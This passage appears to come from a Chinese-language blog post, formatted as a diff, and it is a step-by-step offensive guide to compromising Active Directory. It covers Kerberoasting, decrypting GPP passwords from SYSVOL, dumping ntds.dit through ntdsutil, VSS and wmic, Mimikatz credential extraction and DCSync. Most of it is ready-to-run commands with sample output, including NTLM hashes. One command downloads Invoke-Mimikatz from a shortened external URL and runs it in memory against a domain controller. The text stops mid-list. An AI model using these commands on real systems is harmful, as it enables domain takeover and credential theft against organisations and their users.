+<h2 id="Kerberoasting-Kerberoast攻击的另一种姿势"><a href="#Kerberoasting-Kerberoast攻击的另一种姿势" class="headerlink" title="Kerberoasting - Kerberoast攻击的另一种姿势"></a>Kerberoasting - Kerberoast攻击的另一种姿势</h2><p>我们通常不关心基于主机的SPN，因为计算机的机器帐户密码默认是随机的，每30天更换一次。</p>
+<p>但是，请记住，也可以为域用户帐户注册任意的SPN。</p>
+<p>一个常见的例子就是一个服务账户管理着多个MSSQL实例;此用户帐户注册的每个MSSQL实例都有一个&lt;MSSQLSvc/HOST:PORT&gt; 这样的SPN，</p>
+<p>这个SPN存储在用户的serviceprincipalname属性里.如果我们有一个为域用户帐户注册的任意SPN，</p>
+<p>那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证</p>
+<p>注意的是： 任何具有服务主体名称SPN的域用户帐户都可以被该域中任何用户请求该SPN的TGS，</p>
+<p>从而允许攻击者离线破解服务帐户的明文密码！这显然取决于一个可破解的服务帐户明文密码的复杂度</p>
+<p><strong>老套的”Kerberoasting攻击姿势</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给出的利用方法或工具包是使用工具集的组合来请求票证，并从内存中提取(使用Mimikatz)票证，然后将它们转换为可破解的格式。</span><br></pre></td></tr></table></figure>
+
+<p>一般来说，整个过程如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a. 使用Tim的GetUserSPNS.ps1脚本或者Sean的Find-PSServiceAccounts.ps1脚本或PowerView的<span class="string">"Get-NetUser -SPN"</span>来枚举域帐户的SPN。</span><br><span class="line">枚举域帐户的SPN :</span><br><span class="line">&gt; * GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</span><br><span class="line">    PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1</span><br><span class="line">        ServicePrincipalName : kadmin/changepw</span><br><span class="line">        Name                 : krbtgt</span><br><span class="line">        SAMAccountName       : krbtgt</span><br><span class="line">        MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local</span><br><span class="line">        PasswordLastSet      : <span class="number">9</span>/<span class="number">13</span>/<span class="number">2016</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">59</span> AM</span><br><span class="line">        ServicePrincipalName : test/test</span><br><span class="line">        Name                 : testwin10</span><br><span class="line">        SAMAccountName       : testwin10</span><br><span class="line">        MemberOf             :</span><br><span class="line">        PasswordLastSet      : <span class="number">1</span>/<span class="number">12</span>/<span class="number">2018</span> <span class="number">3</span>:<span class="number">00</span>:<span class="number">22</span> PM</span><br><span class="line">&gt; * PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/<span class="number">5690</span>b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1<span class="comment">#L2087-L2089</span></span><br><span class="line">    PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn</span><br><span class="line">        objectsid              : S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1239069908</span>-<span class="number">882060383</span>-<span class="number">2558203358</span>-<span class="number">502</span></span><br><span class="line">        iscriticalsystemobject : True</span><br><span class="line">        samaccounttype         : <span class="number">805306368</span></span><br><span class="line">        objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local</span><br><span class="line">        objectclass            : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">        logoncount             : <span class="number">0</span></span><br><span class="line">        lastlogon              : <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">        serviceprincipalname   : kadmin/changepw</span><br><span class="line">        adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local</span><br><span class="line">        dscorepropagationdata  : &#123;<span class="number">1</span>/<span class="number">12</span>/<span class="number">2018</span> <span class="number">6</span>:<span class="number">32</span>:<span class="number">42</span> AM, <span class="number">9</span>/<span class="number">13</span>/<span class="number">2016</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">37</span> AM, <span class="number">9</span>/<span class="number">13</span>/<span class="number">2016</span> <span class="number">3</span>:<span class="number">53</span>:<span class="number">08</span> AM, <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM&#125;</span><br><span class="line">        distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local</span><br><span class="line">        ....</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/getspn.png" target="_blank" rel="noopener"><img src="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/getspn.png" alt="getspn"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">b. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的</span><br><span class="line">    System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。</span><br><span class="line"></span><br><span class="line">c. 使用Mimikatz的kerberos::list/export命令从内存中提取这些票证，并设置可选的base64导出格式。</span><br><span class="line">    然后下载票据，或者将base64编码的票证拖到攻击者的机器上进行解码。</span><br><span class="line">d. 使用Tim的tgsrepcrack.py开始离线破解密码:</span><br><span class="line">    https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py</span><br><span class="line">    pip install requests-kerberos,kerberos-sspi</span><br><span class="line">    import kerberos 改成 import kerberos_sspi as kerberos</span><br><span class="line">        python tgsrepcrack.py dic.txt file.kirbi</span><br><span class="line">   或者使用John the Ripper的kirbi2john.py从原始票证中提取可破解的哈希格式：</span><br><span class="line">        python kirbi2john.py *.kirbi &gt; johnkirb.txt</span><br><span class="line">        john johnkirb.txt --wordlist=dic.txt</span><br><span class="line">e. xan7r给 Tim的工具集增加了一个分支，他添加了一个autokerberoast.ps1脚本，自动化了上述攻击过程:</span><br><span class="line">https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1</span><br><span class="line">    此外，@ tifkin_写了一个Go语言版本的TGS爆破器，比原来的Python版本要快一些。</span><br></pre></td></tr></table></figure>
+
+<h2 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h2><p>在域环境中修改域机器的本地账户密码是个很麻烦的事情</p>
+<p>但是微软的GPP(组策略偏好)中提供了一个批量修改本地账户的功能，</p>
+<p>可以一次性批量的修改本地账户密码(组策略不仅仅可以用来批量管理密码)。</p>
+<p>但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件，</p>
+<p>如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码(SYSVOL是一个存储域公共文件服务器副本的共享文件夹，</p>
+<p>所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。)</p>
+<p>一般sysvol文件的位置是 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</span><br></pre></td></tr></table></figure>
+
+<p>其中的groups.xml(Services.xml、ScheduledTasks.xml、Printers.xml、Drives.xml、DataSources.xml)就可能保存了加密后的本地管理账户密码</p>
+<p>(ps:这些文件中并不一定存在密码，因为只有当管理员在配置的时候，在界面的密码框中输入密码之后才会保存(設置計劃任務))</p>
+<p>我们可以通过这个powershell的脚本进行解密Get-GPPPassword.ps1</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1)</span><br><span class="line">. .\Get-GPPPassword.ps1</span><br><span class="line">Get-GPPPassword</span><br><span class="line">同样，我们也可以使用Get-GPPPassword.ps1这个脚本在域内自动搜索所有的sysvol中保存的密码并自动解密</span><br></pre></td></tr></table></figure>
+
+<p>若获取不到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a. 使用了LAPS批量管理域内主机本地管理员帐户 (使用ldapsearch来dump域中的LAPS密码 https://www.anquanke.com/post/id/86502)</span><br><span class="line">    即 Local Administrator Password Solution : LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。</span><br><span class="line">b. 域控安装补丁KB2962486</span><br><span class="line">    这个补丁禁止在组策略配置中填入密码</span><br><span class="line">c. 目标不在组策略中使用域控密码</span><br><span class="line">d. 设置了共享文件夹\SYSVOL的访问权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="ntds-dit-活动目录的数据库文件"><a href="#ntds-dit-活动目录的数据库文件" class="headerlink" title="ntds.dit (活动目录的数据库文件)"></a>ntds.dit (活动目录的数据库文件)</h2><p>包含有关活动目录域中所有对象的所有信息 及 所有域用户和计算机帐户的密码哈希值。</p>
+<p>域控制器(DC)上的ntds.dit文件只能由可以登录到DC的用户访问 。</p>
+<p>这些组可以默认登录到域控制器:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Enterprise Admins (目录林管理员组)</span><br><span class="line">Domain Admins(域管理员组)</span><br><span class="line">Administrators(管理员组)</span><br><span class="line">Backup Operators(备份操作成员)</span><br><span class="line">Account Operators(账户管理组)</span><br><span class="line">Print Operators(打印机操作组)</span><br></pre></td></tr></table></figure>
+
+<p>不能登录到域控制器可能 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a. 限制了有权登录到域控制器的组/帐户。</span><br><span class="line">b. 限制了具有完整活动目录权限的组/帐户，特别是服务帐户。</span><br></pre></td></tr></table></figure>
+
+<p>若帐户登录了域控制器，首先把所有的登录凭证全部获取到本地:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">1. MIMIKATZ从域控上面抓取到所有账户信息:</span><br><span class="line">    mimikatz <span class="comment"># lsadump::lsa /inject exit</span></span><br><span class="line">    or 保存到mimikatz.log:</span><br><span class="line">    mimikatz <span class="comment"># log</span></span><br><span class="line">    mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">    mimikatz <span class="comment"># lsadump::lsa /inject</span></span><br><span class="line">    ![mimikatz-lsa](域渗透相关/mimikatz-lsa.png)</span><br><span class="line">2.使用MIMIKATZ转储LSASS内存(获取域管理员凭据)</span><br><span class="line">    mimikatz <span class="comment"># sekurlsa::minidump c:\temp\lsass.dmp</span></span><br><span class="line">    mimikatz <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line">3. 使用任务管理器转储LSASS内存(获取域管理员凭据)</span><br><span class="line">    一旦LSASS被转储，mimikatz就可以对lsass.dmp进行提取</span><br><span class="line">    右鍵lsass.exe : Create Dump File</span><br><span class="line">4. 用NTDSUTIL创建媒体安装集(IFM) (用于抓取NTDS.DIT文件)</span><br><span class="line">    NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。</span><br><span class="line">    IFM是用于DCPromo命令中”从媒体安装”这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。</span><br><span class="line">    并且也会在c:/temp目录下生成的一份NTDS.dit附件。</span><br><span class="line">        ntdsutil <span class="string">"ac i ntds"</span> <span class="string">"ifm"</span> <span class="string">"create full c:\windows\temp\temp"</span> q q</span><br><span class="line">    創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY</span><br><span class="line">5. 从NTDS.DIT文件(和注册表系统配置单元)转储活动目录域凭据</span><br><span class="line">    需要 ntds.dit 和 system.hive (由第4步得到)</span><br><span class="line">    https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py (only linux):</span><br><span class="line">    -&gt; python secretsdump.py -ntds /root/Desktop/temp/Active Directory/ntds.dit -system /root/Desktop/temp/registry/SYSTEM LOCAL</span><br><span class="line">     -&gt;</span><br><span class="line">        demo.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">        OWA2010DC$:1000:aad3b435b51404eeaad3b435b51404ee:aac6185241728f7685c8d50c61573b75:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f65c6984cbfebdc5f17986d07620afb:::</span><br><span class="line">OWA2010$:1103:aad3b435b51404eeaad3b435b51404ee:d51220f5659cd982fb3fbe4169093181:::</span><br><span class="line">or -&gt; https://github.com/zcgonvh/NTDSDumpEx/releases</span><br><span class="line">    NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hiv</span><br><span class="line">    进一步从NTDS.DIT获取详细的信息:</span><br><span class="line">        https://github.com/libyal/libesedb/releases</span><br><span class="line">        $ ./configure</span><br><span class="line">$ make</span><br><span class="line">        $ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br><span class="line">        root@kali2:~/Desktop/temp<span class="comment"># /usr/local/bin/esedbexport -m tables "/root/Desktop/temp/Active Directory/ntds.dit"</span></span><br><span class="line">        (ntds.dit中提取出表，20分鐘，两个重要的表为:datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中.)</span><br><span class="line">    使用ntdsxtract提取域中信息，一旦表被提取出来，很多python工具可以将这些表中的信息进一步提取，比如ntdsxtract就可以完美进行。</span><br><span class="line">        https://github.com/csababarta/ntdsxtract.git</span><br><span class="line">        root@kali2:~/Desktop/ntdsxtract-master<span class="comment"># python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt</span></span><br><span class="line">        root@kali2:~/Desktop/ntdsxtract-master<span class="comment"># python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv</span></span><br><span class="line">        ![mimikatz-lsa](域渗透相关/libesedb__ntdsxtract__ntds.dit.png)</span><br><span class="line">6. 可创建和使用GOLDEN TICKET</span><br><span class="line">7. 卷影复制(VSS)</span><br><span class="line">    ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)</span><br><span class="line">    1.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@<span class="comment"># process call create "cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log"</span></span><br><span class="line">    2.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@<span class="comment"># process call create "cmd /c copy 卷影ID/Windows/NTDS/NTDS.dit C:/windows/temp/NTDS.dit 2&gt;&amp;1"</span></span><br><span class="line"></span><br><span class="line">8. 其他 - 转储活动目录数据库(ntds.dit)凭证的方法总结</span><br><span class="line">    How Attackers Dump Active Directory Database Credentials</span><br><span class="line">        https://adsecurity.org/?p=2398</span><br><span class="line">    [译]转储活动目录数据库凭证的方法总结</span><br><span class="line">        http://drops.xmd5.com/static/drops/pentesting-12020.html</span><br><span class="line">        之前两篇关于如何转储 AD 数据库凭证的文章：</span><br><span class="line">            a. 攻击者如何从一个域控制器中读取活动目录数据库(NTDS.DIT)(https://adsecurity.org/?p=451)</span><br><span class="line">            b. 在 Active Directory 域中获得管理员权限的攻击方法(https://adsecurity.org/?p=2362  [译]https://xianzhi.aliyun.com/forum/topic/115)</span><br><span class="line"></span><br><span class="line">8-0x00 远程执行命令方式</span><br><span class="line">    有几种不同的方式可以在域控制器上远程执行命令,假设它们已经有了相应的执行权限。最可靠的远程执行方法包括两种 PowerShell(利用 WinRM )和 WMI。</span><br><span class="line"></span><br><span class="line">    WMI</span><br><span class="line">    Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create <span class="string">"COMMAND"</span></span><br><span class="line"></span><br><span class="line">    PowerShell (WMI)</span><br><span class="line">    Invoke-WMIMethod -Class Win32_Process -Name Create –ArgumentList <span class="variable">$COMMAND</span> –ComputerName <span class="variable">$COMPUTER</span> -Credential <span class="variable">$CRED</span></span><br><span class="line"></span><br><span class="line">    WinRM</span><br><span class="line">    winrs –r:COMPUTER COMMAND</span><br><span class="line"></span><br><span class="line">    远程 PowerShell</span><br><span class="line">    Invoke-Command –computername <span class="variable">$COMPUTER</span> -<span class="built_in">command</span> &#123; <span class="variable">$COMMAND</span>&#125;</span><br><span class="line">    New-PSSession -Name PSCOMPUTER –ComputerName <span class="variable">$COMPUTER</span>; Enter-PSSession -Name PSCOMPUTER</span><br><span class="line"></span><br><span class="line">8-0x01 使用 NTDSUtil 创建 IFM 抓取 DC 本地的Ntds.dit文件 (VSS 卷影复制)</span><br><span class="line">    NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令,并且允许为DCPromo准备IFM集。</span><br><span class="line">    IFM是用于DCPromo命令中<span class="string">"从媒体安装"</span>这一过程的,所以,在配置域控时就不需要通过网络从其他域控拷贝数据。</span><br><span class="line">    IFM集,并且也会在c:/temp目录下生成的一份NTDS.dit附件。</span><br><span class="line">        ntdsutil <span class="string">"ac i ntds"</span> <span class="string">"ifm"</span> <span class="string">"create full c:\windows\temp\temp"</span> q q</span><br><span class="line">    创建了temp目录,下面会生成 ntds.dit 和 SYSTEM / SECURITY</span><br><span class="line">    这个命令也可以通过 WMI 或 PowerShell 远程执行。</span><br><span class="line"></span><br><span class="line">8-0x02 使用 VSS 卷影副本远程读取 ntds.dit(通过 WMI or PowerShell 远程管理)</span><br><span class="line">    ntds.dit我们是没法直接进行复制拷贝的,会提示文件已被占用,这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)</span><br><span class="line">    a. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@<span class="comment"># process call create "cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:\vss.log"</span></span><br><span class="line">    当 VSS 快照完成后,我们就可以从 VSS 中将 NTDS.dit 文件和 注册表中的 System hive 复制到域控制器的 C 盘中。</span><br><span class="line"></span><br><span class="line">    b1. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@<span class="comment"># process call create "cmd /c copy 卷影ID\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2&gt;&amp;1 &gt; c:\vss2.log"</span></span><br><span class="line">    b2. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@<span class="comment"># process call create "cmd /c copy 卷影ID\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2&gt;&amp;1 &gt; c:\vss2.log"</span></span><br><span class="line">    之后就可以将域控制器中 c:\\temp 目录的文件复制到本地的计算机中。</span><br><span class="line"></span><br><span class="line">    copy /z \\demo.local\c$\windows\temp\NTDS.dit c:\temp</span><br><span class="line">    copy /z \\demo.local\c$\windows\temp\SYSTEM.hive c:\temp</span><br><span class="line">    较新版本的 Windows 中 WMIC 已经有些过时了。 PowerShell 提供了 Invoke-WMIMethod cmdlet 可以执行相同的功能。</span><br><span class="line"></span><br><span class="line">8-0x03 使用 PowerSploit 的 Invoke-NinjaCopy 远程读取 ntds.dit(需要目标 DC 启用 PowerShell 远程管理)</span><br><span class="line">    Joe Bialek (@JosephBialek)在他的博客中写了如下关于 Invoke-NinjaCopy 的信息。</span><br><span class="line">    目前,已有好几种方法可以转储 Active Directory 和本地密码的 HASH。</span><br><span class="line">    不过直到最近,我发现目前获取 HASH 的技术,需 要依赖于注入代码到 LSASS 进程或使用 VSS ,以获得含有 HASH 文件的副本。</span><br><span class="line">    Invoke-NinjaCopy 的 PowerShell 脚本,支持任何文件(包括NTDS.DIT)的复制,</span><br><span class="line">    无需启动可疑的服务,无需注入代码到进程中,或者提升到 SYSTEM 权限。</span><br><span class="line">    该脚本可以打开整个卷(如C:)的读取句柄并解析 NTFS 结构,从而从一个 NTFS 卷复制文件。此操作需要目标服务器的管理员权限。利用此脚本可以绕过以下保护措施:</span><br><span class="line">    一个已被进程打开且不能被其他进程操作的文件,如 Ntds.dit 文件或注册表中的 SYSTEM hive 配置文件。</span><br><span class="line">    已被设置 SACL 标志的文件,在打开此类文件时,会有提醒(此脚本没有使用 Win32 API 打开文件,因此Windows 没有反应)。</span><br><span class="line">    绕过 DACL ,例如 DACL 只允许 SYSTEM 权限打开一个文件。</span><br><span class="line">    如果指定了 LocalDestination 参数,则文件将被复制到本地服务器(脚本正在从运行的服务器)中指定的文件路径。</span><br><span class="line">    如果指定了 RemoteDestination 参数,则该文件将被复制到远程服务器中指定的文件路径。</span><br><span class="line">    Invoke-NinjaCopy -Path <span class="string">"c:\windows\ntds\ntds.dit"</span> -ComputerName <span class="string">"RDLABDC02"</span> -LocalDestination <span class="string">"c:\temp\ntds.dit"</span></span><br><span class="line">    使用 DIT 快照查看器(https://github.com/yosqueoy/ditsnap) ,可以验证我们是否顺利拿到了Ntds.dit 文件。</span><br><span class="line"></span><br><span class="line">8-0x04 在 DC 中使用 Mimikatz 转储 Active Directory 凭据</span><br><span class="line">    一般情况下服务帐户就是域管理员组或同等权限的成员或者攻击者从域管理员最近登录到的计算机中 dump 出登录凭证。</span><br><span class="line">    使用这些凭据,攻击者可以访问域控制器,并可以得到所有的域凭据,其中包括用于创建 Kerberos 的黄金票证的 KRBTGT 帐户的 NTLM 哈希值。</span><br><span class="line">    1. mimikatz.exe从域控上面抓取到所有账户信息:</span><br><span class="line">    mimikatz lsadump::lsa /inject <span class="built_in">exit</span></span><br><span class="line">    保存到mimikatz.log:</span><br><span class="line">    <span class="comment"># log</span></span><br><span class="line">    <span class="comment"># privilege::debug</span></span><br><span class="line">    <span class="comment"># lsadump::lsa /inject</span></span><br><span class="line">    在域控制器上运行时,Active Directory域中转储凭证数据。需要管理员访问调试或本地SYSTEM权限</span><br><span class="line">    注意:RID 502的帐户是KRBTGT帐户,RID 500的帐户是该域的默认管理员。</span><br><span class="line"></span><br><span class="line">2. Invoke-Mimikatz本地转储Active Directory凭据</span><br><span class="line">    使用 mimikatz 从 LSASS 进程转储凭证 : Invoke-Mimikatz -DumpCreds</span><br><span class="line">    使用 mimikatz 导出所有私有证书即使它们已被标记为不可导出 : Invoke-Mimikatz –DumpCerts</span><br><span class="line">    在远程计算机上使用 debug 提升权限:Invoke-Mimikatz -Command <span class="string">"privilege::debug exit"</span> -ComputerName <span class="string">"computer1"</span></span><br><span class="line">    or Invoke-Mimikatz -Command <span class="string">'"privilege::debug" "LSADump::LSA /inject" exit'</span></span><br><span class="line"></span><br><span class="line">3. 使用 Invoke-Mimikatz 远程转储 Active Directory 凭据 (通过 PowerShell 远程管理)</span><br><span class="line">    外网下载并完全是在内存中执行代码</span><br><span class="line">    IEX(New-Object Net.WebClient).DownloadString(<span class="string">'http://is.gd/oeoFuI'</span>); Invoke-Mimikatz -Command <span class="string">'"privilege::debug" "LSADump:LSA /inject"'</span> -Computer dc2010.demo.local</span><br><span class="line"></span><br><span class="line">8-0x05 使用 Mimikatz 的 DCSync 功能远程转储 Active Directory 凭据</span><br><span class="line">    理解：向 DC 发起同步一个对象（获取帐户的密码数据）的质询。需要域管理员，域管理员组或者自定义委派的一个成员权限。</span><br><span class="line">    2015新的特性—— “DCSync”,可以有效地“假冒”一个域控制器,并可以向目标域控制器请求帐户密码数据。</span><br><span class="line">    之前利用 DCSync 的攻击方法是在域控制器上运行 Mimikatz 或 Invoke-Mimikatz 得到 KRBTGT 账户的密码哈希创建黄金票证。</span><br><span class="line">    如果使用适当的权限执行 Mimikatz 的 DCSync 功能,攻击者就可以通过网络远程读取域控制器的密码哈希,以及以前的密码的哈希,</span><br><span class="line">    且无需交互式登录或复制 Active Directory 的数据库文件NTDS.DIT。</span><br><span class="line"></span><br><span class="line">    运行 DCSync 所要求的特殊权限有管理员组Administrators,域管理员组 Domain Admins或企业管理员组Enterprise Admins</span><br><span class="line">    以及域控制器计算机帐户的任何成员都能够运行 DCSync 去读取密码数据。</span><br><span class="line">    需要注意的是只读域控制器默认是不允许读取用户密码数据的。</span><br><span class="line"></span><br><span class="line">    DCSync 是何如工作的:</span><br><span class="line"></span><br><span class="line">        a. 使用指定的域名称发现域控制器。</span><br><span class="line">        b. 请求域控制器通过 DSGetNCChanges 复制用户凭据利用目录复制服务DRS远程协议</span><br><span class="line">        DCSync 选项:</span><br><span class="line">        /user - 要拉取数据的用户的 id 或 SID</span><br><span class="line">        /domain可选的 Active Directory 域的 FQDN 域名,Mimikatz 会发现域中的一个 DC 